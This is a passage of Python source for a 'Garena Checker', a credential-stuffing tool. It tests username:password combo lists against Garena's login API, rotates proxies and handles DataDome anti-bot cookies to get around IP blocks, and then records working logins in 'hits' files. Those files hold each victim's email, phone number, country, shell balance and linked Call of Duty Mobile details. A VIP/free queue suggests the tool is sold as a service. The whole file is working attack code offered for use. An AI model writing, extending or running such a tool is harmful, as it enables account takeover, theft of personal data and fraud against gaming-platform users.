            f"{cyan}║{reset}  {yellow}LIVE STATISTICS{reset} {gray}|{reset} {white}Garena Checker{reset}                         {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  {yellow}Progress:{reset} [{green}{bar}{reset}] {pct*100:.1f}%            {cyan}║{reset}\n"
            f"{cyan}║{reset}  {white}Speed: {magenta}{stats['speed']:.1f}/s{reset} {gray}│{reset} {white}ETA: {blue}{int(eta_secs)}s{reset} {gray}│{reset} {white}Elapsed: {green}{int(stats['elapsed'])}s{reset}   {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  {white}Processed: {magenta}{stats['total']:>4}{reset} {gray}│{reset} {white}Success: {green if success_rate >= 50 else red}{success_rate:>5.1f}%{reset}              {cyan}║{reset}\n"
            f"{cyan}║{reset}  {green}Valid: {stats['valid']:>4}{reset} {gray}│{reset} {red}Invalid: {stats['invalid']:>4}{reset} {gray}│{reset} {blue}Clean: {stats['clean']:>4}{reset}  {cyan}║{reset}\n"
            f"{cyan}║{reset}  {yellow}Not Clean: {stats['not_clean']:>4}{reset} {gray}│{reset} {magenta}CODM: {stats['has_codm']:>4}{reset} {gray}│{reset} {gray}No CODM: {stats['no_codm']:>4}{reset} {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  👑 {white}VIP checked:  {green}{stats['vip_processed']:>4}{reset} (no queue - instant)      {cyan}║{reset}\n"
            f"{cyan}║{reset}  🆓 {white}Free checked: {yellow}{stats['free_processed']:>4}{reset} (queued - waiting)       {cyan}║{reset}\n"
            f"{cyan}╚══════════════════════════════════════════════════════════╝{reset}\n"
        )

# ============================================================
# VIP/FREE PRIORITY QUEUE SYSTEM
# ============================================================

class VipFreeQueue:
    """
    Priority queue where:
      - VIP accounts have NO queue — they are processed immediately
        Workers acquire VIP semaphore FIRST (always available), then grab account.
      - Free accounts HAVE a queue — they wait in line for available free slots
        Workers acquire Free semaphore FIRST (blocks if all slots taken = QUEUE),
        then grab account.
      - VIP accounts always get processed before Free accounts
      - VIP and Free semaphores are completely independent

    CRITICAL DESIGN: Semaphore is acquired BEFORE pulling from queue.
    This prevents the race condition where a worker pulls an account but
    then blocks on the semaphore, making that account invisible to other workers.
    """

    def __init__(self, vip_threads: int, free_threads: int):
        self.vip_queue = Queue()     # VIP queue — drained ASAP
        self.free_queue = Queue()    # Free queue — FIFO, waits for free slots
        self._lock = Lock()
        self._vip_added = 0
        self._free_added = 0
        self._vip_done = 0
        self._free_done = 0
        self._total = 0
        self._done = 0
        self._stop_event = Event()
        self.vip_threads = vip_threads
        self.free_threads = free_threads

        # ── THE KEY DIFFERENCE ──
        # VIP semaphore: VIP workers acquire this FIRST, then grab account.
        #   Since vip_threads matches the number of VIP workers, this is
        #   essentially instant — no queuing ever.
        # Free semaphore: Free workers acquire this FIRST, then grab account.
        #   Since there are more accounts than free_threads, workers queue up
        #   here — this IS the queue. Only free_threads workers can proceed
        #   at a time; the rest wait.
        self._vip_sem = Semaphore(vip_threads)
        self._free_sem = Semaphore(free_threads)

        # Track accounts "in flight" (pulled from queue but not yet done)
        self._vip_in_flight = 0
        self._free_in_flight = 0

    def add_vip(self, account: dict):
        """Add VIP account — NO queue, goes straight to processing."""
        with self._lock:
            self._vip_added += 1
            self._total += 1
        self.vip_queue.put(account)

    def add_free(self, account: dict):
        """Add Free account — goes into the queue, waits for available slot."""
        with self._lock:
            self._free_added += 1
            self._total += 1
        self.free_queue.put(account)

    def acquire_vip_slot(self, timeout: float = None) -> bool:
        """Acquire a VIP processing slot. Returns True if acquired."""
        return self._vip_sem.acquire(timeout=timeout)

    def release_vip_slot(self):
        """Release a VIP processing slot."""
        self._vip_sem.release()

    def acquire_free_slot(self, timeout: float = None) -> bool:
        """Acquire a Free processing slot. BLOCKS if all free slots taken = QUEUE."""
        return self._free_sem.acquire(timeout=timeout)

    def release_free_slot(self):
        """Release a Free processing slot."""
        self._free_sem.release()

    def get_vip(self) -> Optional[dict]:
        """Get next VIP account (non-blocking)."""
        try:
            account = self.vip_queue.get_nowait()
            with self._lock:
                self._vip_in_flight += 1
            return account
        except:
            return None

    def get_free(self) -> Optional[dict]:
        """Get next Free account (non-blocking)."""
        try:
            account = self.free_queue.get_nowait()
            with self._lock:
                self._free_in_flight += 1
            return account
        except:
            return None

    def mark_vip_done(self):
        with self._lock:
            self._vip_done += 1
            self._done += 1
            self._vip_in_flight = max(0, self._vip_in_flight - 1)

    def mark_free_done(self):
        with self._lock:
            self._free_done += 1
            self._done += 1
            self._free_in_flight = max(0, self._free_in_flight - 1)

    @property
    def vip_pending(self):
        return self.vip_queue.qsize()

    @property
    def free_pending(self):
        return self.free_queue.qsize()

    @property
    def total_pending(self):
        return self.vip_pending + self.free_pending

    @property
    def vip_remaining(self):
        """Accounts still in queue + in flight."""
        with self._lock:
            return self.vip_queue.qsize() + self._vip_in_flight

    @property
    def free_remaining(self):
        """Accounts still in queue + in flight."""
        with self._lock:
            return self.free_queue.qsize() + self._free_in_flight

    @property
    def progress(self):
        with self._lock:
            if self._total == 0:
                return 0
            return (self._done / self._total) * 100

    def is_empty(self):
        """True only when all accounts are fully processed."""
        with self._lock:
            return (self.vip_queue.empty() and self.free_queue.empty()
                    and self._vip_in_flight == 0 and self._free_in_flight == 0)

    def all_done(self):
        """True when every added account has been processed."""
        with self._lock:
            return self._done >= self._total and self._total > 0

    def stop(self):
        self._stop_event.set()

    def should_stop(self):
        return self._stop_event.is_set()

# ============================================================
# RESULT SAVER
# ============================================================

class ResultSaver:
    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        self._lock = Lock()
        os.makedirs(output_dir, exist_ok=True)

        # Clear previous results
        for f in ['hits.txt', 'hits_codm.txt', 'invalid.txt', '2fa.txt', 'errors.txt', 'clean.txt', 'not_clean.txt']:
            filepath = os.path.join(output_dir, f)
            if os.path.exists(filepath):
                os.remove(filepath)

    def save_hit(self, username, password, details, codm_info=None, is_vip=False):
        with self._lock:
            type_tag = "VIP" if is_vip else "FREE"
            filepath = os.path.join(self.output_dir, 'hits.txt')
            with open(filepath, 'a', encoding='utf-8') as f:
                email = details.get('email', 'N/A')
                country = details.get('personal', {}).get('country', 'N/A')
                shell = details.get('profile', {}).get('shell_balance', 'N/A')
                mobile = details.get('personal', {}).get('mobile_no', 'N/A')
                is_clean = 'CLEAN' if details.get('is_clean') else 'NOT CLEAN'
                f.write(f"{username}:{password} | {type_tag} | {is_clean} | Email: {email} | Country: {country} | Shell: {shell} | Mobile: {mobile}\n")

            if codm_info:
                filepath = os.path.join(self.output_dir, 'hits_codm.txt')
                with open(filepath, 'a', encoding='utf-8') as f:
                    codm_nick = codm_info.get('codm_nickname', 'N/A')
                    codm_lvl = codm_info.get('codm_level', 'N/A')
                    codm_rgn = codm_info.get('region', 'N/A')
                    codm_uid = codm_info.get('uid', 'N/A')
                    f.write(f"{username}:{password} | {type_tag} | Nick: {codm_nick} | Level: {codm_lvl} | Region: {codm_rgn} | UID: {codm_uid}\n")

            # Save clean/not clean
            if details.get('is_clean'):
                filepath = os.path.join(self.output_dir, 'clean.txt')
            else:
                filepath = os.path.join(self.output_dir, 'not_clean.txt')
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")

    def save_invalid(self, username, password, is_vip=False):
        with self._lock:
            type_tag = "VIP" if is_vip else "FREE"
            filepath = os.path.join(self.output_dir, 'invalid.txt')
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password} | {type_tag}\n")

    def save_error(self, username, password, error, is_vip=False):
        with self._lock:
            type_tag = "VIP" if is_vip else "FREE"
            filepath = os.path.join(self.output_dir, 'errors.txt')
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password} | {type_tag} | Error: {error}\n")

# ============================================================
# MAIN CHECKER ENGINE
# ============================================================

class GarenaChecker:
    """Main checker with VIP priority (no queue) and Free queue system."""

    def __init__(self, config: dict):
        self.config = config
        self.stats = LiveStats()
        self.saver = ResultSaver(config.get('output_dir', 'results'))
        self._running = False
        self._all_sessions = []
        self._all_sessions_lock = Lock()

    def create_session(self, datadome_manager):
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        })
        # Reduce connection pool to save memory
        adapter = requests.adapters.HTTPAdapter(pool_connections=3, pool_maxsize=5)
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        if proxy_rotator.total > 0:
            session.proxies.update(proxy_rotator.get_proxies())

        # Get initial datadome
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            datadome_manager.set_session_datadome(session, datadome)

        return session

    def process_account(self, session, account, password, datadome_manager, is_vip=False):
        """Process a single account — full check flow from original."""
        try:
            MAX_IP_BLOCK_RETRIES = self.config.get('max_ip_block_retries', 2)
            v1, v2, new_datadome = None, None, None

            for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
                datadome_manager.clear_session_datadome(session)
                current_datadome = datadome_manager.get_datadome()
                if current_datadome:
                    datadome_manager.set_session_datadome(session, current_datadome)

                v1, v2, new_datadome = prelogin(session, account, datadome_manager)

                if v1 == "IP_BLOCKED":
                    logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES}")
                    session.proxies.update(proxy_rotator.force_rotate())
                    fresh_dd = get_datadome_cookie(session)
                    if fresh_dd:
                        datadome_manager.set_datadome(fresh_dd)
                        datadome_manager.set_session_datadome(session, fresh_dd)
                    continue

                if v1 == "CONN_ERROR":
                    logger.warning(f"[RETRY] Connection error attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES}")
                    proxy_rotator.rotate()
                    session.proxies.update(proxy_rotator.get_proxies())
                    continue

                break

            if v1 in ("IP_BLOCKED", "CONN_ERROR"):
                logger.error(f"[RETRY] Exhausted retries for {account} — skipping")
                self.stats.update_stats(valid=False, is_vip=is_vip)
                self.saver.save_error(account, password, f"Proxy exhausted after {MAX_IP_BLOCK_RETRIES} retries", is_vip)
                return

            if not v1 or not v2:
                self.stats.update_stats(valid=False, is_vip=is_vip)
                self.saver.save_invalid(account, password, is_vip)
                return

            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)

            sso_key = login(session, account, password, v1, v2)

            if not sso_key:
                self.stats.update_stats(valid=False, is_vip=is_vip)
                self.saver.save_invalid(account, password, is_vip)
                return

            # Account/init with retry on 403
            account_data = None
            for init_attempt in range(2):
                current_cookies = session.cookies.get_dict()
                cookie_parts = []
                for cn in ['apple_state_key', 'datadome', 'sso_key']:
                    if cn in current_cookies:
                        cookie_parts.append(f"{cn}={current_cookies[cn]}")
                cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

                headers = {
                    'accept': '*/*',
                    'referer': 'https://account.garena.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
                }
                if cookie_header:
                    headers['cookie'] = cookie_header

                response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=5)

                if response.status_code == 403:
                    logger.warning(f"[INIT] 403 attempt {init_attempt + 1}/2")
                    if datadome_manager.handle_403(session):
                        session.proxies.update(proxy_rotator.get_proxies())
                        time.sleep(0.01 + init_attempt * 0.01)
                        continue
                    self.stats.update_stats(valid=False, is_vip=is_vip)
                    self.saver.save_error(account, password, "IP Blocked - account/init failed", is_vip)
                    return

                try:
                    account_data = response.json()
                except json.JSONDecodeError:
                    self.stats.update_stats(valid=False, is_vip=is_vip)
                    return
                break

            if account_data is None:
                self.stats.update_stats(valid=False, is_vip=is_vip)
                self.saver.save_error(account, password, "account/init failed after retries", is_vip)
                return

            if 'error' in account_data:
                self.stats.update_stats(valid=False, is_vip=is_vip)
                self.saver.save_invalid(account, password, is_vip)
                return

            if 'user_info' in account_data:
                details = parse_account_details(account_data)
            else:
                details = parse_account_details({'user_info': account_data})

            # Check CODM
            has_codm, codm_info = check_codm_account(session, account)

            is_clean = details.get('is_clean', False)
            self.stats.update_stats(valid=True, clean=is_clean, has_codm=has_codm, is_vip=is_vip)
            self.saver.save_hit(account, password, details, codm_info if has_codm else None, is_vip)

            # Print result
            type_icon = "👑" if is_vip else "🆓"
            clean_tag = f"{Colors.GREEN}CLEAN{Colors.RESET}" if is_clean else f"{Colors.RED}NOT CLEAN{Colors.RESET}"

            username = details.get('username', account)
            email = details.get('email', 'N/A')
            shell = details.get('profile', {}).get('shell_balance', 'N/A')
            country = details.get('personal', {}).get('country', 'N/A')

            if has_codm and codm_info:
                codm_lvl = codm_info.get('codm_level', 'N/A')
                codm_rgn = codm_info.get('region', 'N/A')
                print(f"  ✅ {type_icon} {Colors.LIGHTGREEN_EX}[HIT]{Colors.RESET} {username}:{password} | {clean_tag} | CODM Lv{codm_lvl} ({codm_rgn}) | Shell: {shell} | {country}")
            else:
                print(f"  ✅ {type_icon} {Colors.GREEN}[VALID]{Colors.RESET} {username}:{password} | {clean_tag} | No CODM | Shell: {shell} | {country}")

        except Exception as e:
            logger.error(f"      💥 Unexpected error: {e}")
            self.stats.update_stats(valid=False, is_vip=is_vip)
            self.saver.save_error(account, password, str(e)[:100], is_vip)

    def run(self, accounts: List[dict], vip_threads: int = 5, free_threads: int = 2):
        """Run the checker with VIP priority and Free queue."""
        self._running = True
        self.stats.start_tracking(len(accounts))

        # Separate VIP and Free accounts
        # For standalone CLI: all are Free unless --vip-keys is used
        # The bot version determines VIP from redeem key tier
        vip_accounts = [a for a in accounts if a.get('is_vip', False)]
        free_accounts = [a for a in accounts if not a.get('is_vip', False)]

        print(f"\n{'='*60}")
        print(f"  🚀 GARENA CHECKER — VIP/FREE PRIORITY SYSTEM")
        print(f"{'='*60}")
        print(f"  Total accounts:   {len(accounts)}")
        print(f"  👑 VIP accounts:  {len(vip_accounts)} → NO QUEUE — {vip_threads} threads instant")
        print(f"  🆓 Free accounts: {len(free_accounts)} → QUEUED — {free_threads} threads waiting")
        print(f"  Proxy pool:       {proxy_rotator.total}")
        print(f"  Output dir:       {self.config.get('output_dir', 'results')}")
        print(f"{'='*60}\n")

        # Create priority queue
        pq = VipFreeQueue(vip_threads, free_threads)

        # Add all accounts
        for a in vip_accounts:
            pq.add_vip(a)
        for a in free_accounts:
            pq.add_free(a)

        # Thread-local storage for sessions
        thread_local = threading.local()
        thread_init_lock = Lock()

        def get_session():
            if not hasattr(thread_local, "session"):
                dm = DataDomeManager()
                with thread_init_lock:
                    thread_local.session = self.create_session(dm)
                thread_local.dm = dm
                with self._all_sessions_lock:
                    self._all_sessions.append(thread_local.session)
            else:
                if proxy_rotator.total > 0:
                    thread_local.session.proxies.update(proxy_rotator.get_proxies())
            return thread_local.session, thread_local.dm

        # ── VIP Worker: Acquires slot FIRST (instant), then processes account ──
        # KEY: VIP semaphore is acquired BEFORE pulling from queue.
        # Since # of VIP workers = vip_threads, the semaphore always has slots
        # available → NO QUEUE for VIP accounts.
        def vip_worker():
            while not pq.should_stop():
                # Step 1: Acquire VIP slot (instant — dedicated VIP pool)
                if not pq.acquire_vip_slot(timeout=0.5):
                    # Timeout — check if there's still work
                    if pq.vip_remaining == 0 and not self._running:
                        break
                    continue

                # Step 2: Get next VIP account
                account = pq.get_vip()
                if account is None:
                    # No account in queue — release slot and wait
                    pq.release_vip_slot()
                    if pq.vip_remaining == 0 and not self._running:
                        break
                    time.sleep(0.05)
                    continue

                # Step 3: Process the account
                try:
                    sess, dm = get_session()
                    self.process_account(sess, account['username'], account['password'], dm, is_vip=True)
                except Exception as e:
                    logger.debug(f"[VIP-WORKER] Error: {e}")
                finally:
                    pq.release_vip_slot()
                    pq.mark_vip_done()

        # ── Free Worker: Acquires slot FIRST (BLOCKS if full = QUEUE), then processes ──
        # KEY: Free semaphore is acquired BEFORE pulling from queue.
        # If all free_threads slots are taken, the worker WAITS here — this IS the queue.
        # Once a slot opens up, the worker grabs the next account and processes it.
        def free_worker():
            while not pq.should_stop():
                # Step 1: Acquire Free slot — THIS IS THE QUEUE
                # If all free_threads slots are busy, worker blocks here until one opens
                if not pq.acquire_free_slot(timeout=0.5):
                    # Timeout — check if there's still work
                    if pq.free_remaining == 0 and not self._running:
                        break
                    continue

                # Step 2: Get next Free account (now that we have a slot)
                account = pq.get_free()
                if account is None:
                    # No account in queue — release slot and wait
                    pq.release_free_slot()
                    if pq.free_remaining == 0 and not self._running:
                        break
                    time.sleep(0.05)
                    continue

                # Step 3: Process the account
                try:
                    sess, dm = get_session()
                    self.process_account(sess, account['username'], account['password'], dm, is_vip=False)
                except Exception as e:
                    logger.debug(f"[FREE-WORKER] Error: {e}")
                finally:
                    pq.release_free_slot()
                    pq.mark_free_done()

        # Start workers
        workers = []

        # VIP workers — always running, drain VIP queue instantly
        for i in range(vip_threads):
            t = threading.Thread(target=vip_worker, name=f"VIP-{i+1}", daemon=True)
            t.start()
            workers.append(t)

        # Free workers — limited, processes Free queue when VIP queue is empty
        for i in range(free_threads):
            t = threading.Thread(target=free_worker, name=f"FREE-{i+1}", daemon=True)
            t.start()
            workers.append(t)

        # Stats printer
        def stats_printer():
            while not pq.should_stop():
                print(self.stats.display_stats())
                time.sleep(5)

        stats_thread = threading.Thread(target=stats_printer, daemon=True)
        stats_thread.start()

        # Wait for ALL accounts to be fully processed (including in-flight)
        while not pq.all_done():
            time.sleep(1)

        # Signal stop
        self._running = False
        pq.stop()

        # Wait for workers to finish
        for t in workers:
            t.join(timeout=3)

        # Close sessions
        with self._all_sessions_lock:
            for sess in self._all_sessions:
                try:
                    sess.close()
                except Exception:
                    pass
            self._all_sessions.clear()

        gc.collect()

        # Print final stats
        print(self.stats.display_stats())
        self._save_summary()

    def _save_summary(self):
        output_dir = self.config.get('output_dir', 'results')
        filepath = os.path.join(output_dir, "summary.txt")
        stats = self.stats.get_stats()

        with open(filepath, 'w') as f:
            f.write(f"Garena Checker — Summary Report\n")
            f.write(f"{'='*60}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total accounts: {stats['total_accounts']}\n")
            f.write(f"Checked: {stats['total']}\n")
            f.write(f"Hits: {stats['valid']}\n")
            f.write(f"Invalid: {stats['invalid']}\n")
            f.write(f"Clean: {stats['clean']}\n")
            f.write(f"Not Clean: {stats['not_clean']}\n")
            f.write(f"Has CODM: {stats['has_codm']}\n")
            f.write(f"No CODM: {stats['no_codm']}\n")
            f.write(f"Speed: {stats['speed']:.1f}/s\n")
            f.write(f"Elapsed: {stats['elapsed']:.1f}s\n")
            f.write(f"\n👑 VIP checked: {stats['vip_processed']} (no queue)\n")
            f.write(f"🆓 Free checked: {stats['free_processed']} (queued)\n")
            f.write(f"\nConfig:\n")
            f.write(f"  VIP threads: {self.config.get('vip_threads', 5)}\n")
            f.write(f"  Free threads: {self.config.get('free_threads', 2)}\n")

        print(f"\n  📁 Summary saved to: {filepath}")

# ============================================================
# MAIN
# ============================================================

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Garena Account Checker with VIP/Free Priority Queue",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 garena_checker_v2.py --combo combo.txt
  python3 garena_checker_v2.py --combo combo.txt --vip-threads 5 --free-threads 2
  python3 garena_checker_v2.py --combo combo.txt --proxy proxies.txt
  python3 garena_checker_v2.py --combo combo.txt --vip-keys "gmail.com,vip_user"
        """
    )

    parser.add_argument('--combo', '-c', required=True, help='Path to combo file')
    parser.add_argument('--vip-threads', type=int, help='Number of VIP worker threads (default: 5)')
    parser.add_argument('--free-threads', type=int, help='Number of Free worker threads (default: 2)')
    parser.add_argument('--proxy', '-p', help='Path to proxy file')
    parser.add_argument('--vip-keys', help='Comma-separated VIP key patterns (marks matching accounts as VIP)')
    parser.add_argument('--timeout', type=int, help='Request timeout in seconds')
    parser.add_argument('--output', '-o', help='Output directory')
    parser.add_argument('--no-auto-fix', action='store_true', help='Disable auto-fix of combo file')

    args = parser.parse_args()

    # Load config
    config = load_config()

    # Override with command line args
    if args.vip_threads is not None:
        config['vip_threads'] = args.vip_threads
    if args.free_threads is not None:
        config['free_threads'] = args.free_threads
    if args.timeout is not None:
        config['timeout'] = args.timeout
    if args.output:
        config['output_dir'] = args.output
    if args.no_auto_fix:
        config['auto_fix_combo'] = False

    save_config(config)

    # Parse combo file
    print("\n📋 Parsing combo file...")
    combo_parser = ComboParser(config)

    if not os.path.exists(args.combo):
        print(f"❌ Combo file not found: {args.combo}")
        sys.exit(1)

    accounts = combo_parser.parse(args.combo)

    print(f"  Loaded: {len(accounts)} accounts")
    print(f"  Skipped: {len(combo_parser.skipped)} entries")

    if combo_parser.fixes:
        print(f"  Auto-fixed: {len(combo_parser.fixes)} entries")
        for fix in combo_parser.fixes:
            print(f"    {fix}")

    if combo_parser.skipped:
        print(f"  Skipped entries:")
        for line_num, content, reason in combo_parser.skipped:
            print(f"    Line {line_num}: {reason} - '{content[:50]}'")

    # Mark VIP accounts
    vip_keys = []
    if args.vip_keys:
        vip_keys = [k.strip().lower() for k in args.vip_keys.split(',')]
    elif config.get('vip_keys'):
        vip_keys = [k.strip().lower() for k in config['vip_keys']]

    if vip_keys:
        for account in accounts:
            for key in vip_keys:
                if key in account['username'].lower():
                    account['is_vip'] = True
                    break

    vip_count = sum(1 for a in accounts if a.get('is_vip', False))
    free_count = len(accounts) - vip_count
    print(f"\n  👑 VIP accounts: {vip_count}")
    print(f"  🆓 Free accounts: {free_count}")

    # Load proxies
    if args.proxy:
        config['use_proxy'] = True
        config['proxy_file'] = args.proxy
        count = proxy_rotator.load(args.proxy)
        print(f"  🌐 Loaded {count} proxies")
    elif config.get('proxy_file') and os.path.exists(config.get('proxy_file', '')):
        config['use_proxy'] = True
        count = proxy_rotator.load(config['proxy_file'])
        print(f"  🌐 Loaded {count} proxies")

    # Run checker
    checker = GarenaChecker(config)

    try:
        checker.run(
            accounts,
            vip_threads=config.get('vip_threads', 5),
            free_threads=config.get('free_threads', 2)
        )
    except KeyboardInterrupt:
        print("\n\n⛔ Stopped by user")
        print(checker.stats.display_stats())
        checker._save_summary()

if __name__ == "__main__":
    main()
